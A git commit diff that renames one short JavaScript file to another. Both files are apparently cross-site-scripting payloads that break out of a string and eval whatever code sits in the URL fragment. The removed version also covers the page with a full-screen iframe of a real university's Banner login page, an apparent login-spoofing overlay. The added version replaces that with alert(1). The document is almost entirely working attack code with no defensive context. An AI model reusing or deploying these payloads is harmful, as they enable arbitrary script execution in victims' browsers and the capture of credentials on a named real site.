b49af607613bc51cf1e1d2a0157ef5508e762233
Abdullah AlSolaiman <45393986+AbdullahAlSolaiman@users.noreply.github.com>
2022-06-07 12:13:11 +0300

    Update and rename q-u.js to xx.js

--- q-u.js
+++
@@ -1,8 +0,0 @@
-'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{
-    window.addEventListener("load", myFunction)
-    function myFunction(){
-        document.getElementsByTagName('body')[0].innerHTML = `<iframe src="https://mybanner.qu.edu.qa/PROD/bwskalog.P_DispLoginNon" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>`;
-    }
-    
-    
-}
---
+++ xx.js
@@ -0,0 +1,8 @@
+'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{
+    window.addEventListener("load", myFunction)
+    function myFunction(){
+        alert(1);
+    }
+    
+    
+}
